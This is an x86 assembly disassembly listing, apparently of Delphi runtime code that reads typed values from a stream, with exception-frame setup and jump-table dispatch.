cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41cc68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41cc68
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4150d8
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d9c8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbbb
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edi ebx
jmp r-xdata
sub_41db6e
add [ eax ] eax
add [ eax ] al
in al dx
jae r-xdata
fistp [ esi - 0x2 ]
add [ edx - 0x25 ] bh
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403af8
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbbb
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_41dbc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_418560
mov ebx eax
test ebx ebx
je r-xdata
call sub_41c754
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41514c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41dc0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c1e8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418b9c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41dc4c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41dc9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41edd0
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41596c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dca2
lea eax [ ebp - 0x10 ]
call sub_40f510
retn
sub_41dca8
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41dd5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cc58
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d6c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c1e8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418b9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e6b8
lea eax [ ebp - 0x4 ]
call sub_405ab8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415b08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd61
lea eax [ ebp - 0x8 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
sub_41dd68
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e063
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e06a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x24 ]
call sub_4047f8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40413c
retn
jmp [ eax * 4 + jump_table_41ddf8 ]
mov eax [ rw-data ]
call sub_41c73c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4150d8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc58
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd18
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41514c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d6c8
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414f80
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41514c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5ac
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415720
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41e518
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415420
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41e5d4
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415534
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e3fc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41514c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc58
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc58
cmp al 0xd
jne r-xdata
push ebp
call sub_41dc4c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d834
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415a4c
jmp r-xdata
push ebp
call sub_41dca8
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4150d8
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d7c8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41514c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d6c8
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dbc4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6b8
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41514c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41d6c8
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6b8
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4159ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6b8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4150d8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41cd70
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4159ec
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d6c8
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dc0c
pop ecx
jmp r-xdata
sub_41e070
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40416c
jmp r-xdata
mov eax [ ebx ]
call sub_4186f8
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e0d0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e3eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e4b8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41e3c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e38a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
mov eax [ ebp - 0x1c ]
call sub_41821c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41e070
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403264
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417f6c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41e32f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_4061e8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418b9c
xor eax eax
push ebp
push sub_41e30f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418d54
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e316
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_40331c
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418cf8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41e360
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403b4c
jmp r-xdata
call sub_403af8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41c464
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3d0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41e38f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41c60c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3d0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_40331c
sub_41e3fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e4a6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e479
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e6b8
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414e50
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41c754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41c78c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4ad
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41e4dc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cc7c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404208
mov eax esi
call j_sub_4045e4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41cc7c
pop edx
pop esi
pop ebx
retn
sub_41e518
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e5c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41cc58
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41e5d4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4043a0
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5cc
lea eax [ ebp - 0x8 ]
call sub_4047f8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e6b8
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41cc7c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404764
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41cc7c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41cc7c
jmp r-xdata
jmp r-xdata
call sub_41c754
sub_41e5d4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e6ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41cc58
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41e518
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404944
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6b2
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e6b8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41cc7c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404a40
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41cc7c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41cc7c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404764
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41cc7c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405e88
jmp r-xdata
jmp r-xdata
call sub_41c754
sub_41e6cc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e708
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e4dc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e70f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41e714
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c914
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e7c8
mov eax [ ebx ]
call sub_41d880
pop ebx
pop ebp
retn
sub_41e73c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41cc7c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ebc0
pop ebx
pop ecx
pop ebp
retn
sub_41e76c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c914
test al al
je r-xdata
mov eax [ ebx ]
call sub_41cc58
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41d880
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41ebc0
jmp r-xdata
mov eax [ ebx ]
call sub_41e7c8
mov eax [ ebx ]
call sub_41c914
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e964
mov eax [ ebx ]
call sub_41d880
sub_41e7c8
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e6b8
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e95e
lea eax [ ebp - 0x8 ]
call sub_404118
retn
jmp [ eax * 4 + jump_table_41e7ff ]
push ebp
call sub_41e714
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e4dc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e73c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6cc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e73c
pop ecx
jmp r-xdata
push ebp
call sub_41e76c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
push ebp
mov eax 0x2
call sub_41e73c
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ebc0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e73c
pop ecx
sub_41e964
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e9a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e4dc
mov eax ebx
call sub_41e7c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9a8
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41e9ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41ea44
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41c914
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41e4dc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41e4dc
jmp r-xdata
mov eax ebx
call sub_41e964
mov eax ebx
call sub_41d880
jmp r-xdata
mov eax ebx
call sub_41c914
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e9ac
mov eax ebx
call sub_41d880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea4b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_41ea54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41eaf9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4041b0
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_421f84
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb00
lea eax [ ebp - 0x8 ]
call sub_404118
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_41eb24
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41eb4c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41cbac
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_41815c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403530
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41cbac
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41ebc0
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41cc7c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41cc7c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41ec08
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41edb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41c7e0
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ed8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
